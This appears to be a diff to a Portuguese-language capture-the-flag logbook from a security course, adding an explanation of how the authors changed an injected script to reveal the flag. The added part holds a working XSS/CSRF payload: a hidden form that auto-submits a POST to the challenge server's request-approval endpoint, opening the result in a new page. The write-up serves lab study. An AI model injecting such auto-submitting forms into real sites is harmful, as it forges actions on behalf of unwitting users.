@@ -37,4 +37,18 @@ Com isso, o 'input' que enviamos foi o seguinte:
 ![Alt text](uploads/logbook6P4.png)
 ![Alt text](uploads/logbook6P5.png)
 ![Alt text](uploads/logbook6P6.png)
+
+<p> 
+Considerando que de facto o método explicado anteriormente não é assim tão simples de executar, resolvemos alterar o input de forma a que uma nova página fosse aberta com a flag. Para isso, alteramos o 'script' que enviamos para o seguinte:
+</p>
 </div>
+
+```html
+<form method="POST" id='fake_id' action="http://ctf-fsi.fe.up.pt:5005/request/6b14dc9c65f712d891dfffadbfcec3d631d032d4/approve" role="form" target="blank">
+    <div class="submit">     
+        <input type="submit">
+    </div> 
+</form> 
+<script>document.getElementById('fake_id').submit()</script> 
+```
+<p> Como se pode perceber, a unica alteração que foi feita foi a adição do atributo 'target="blank"' no 'form' que foi colocado no input. Este atributo faz com que o formulário seja submetido numa nova página, o que permite que a flag seja mostrada. </p>
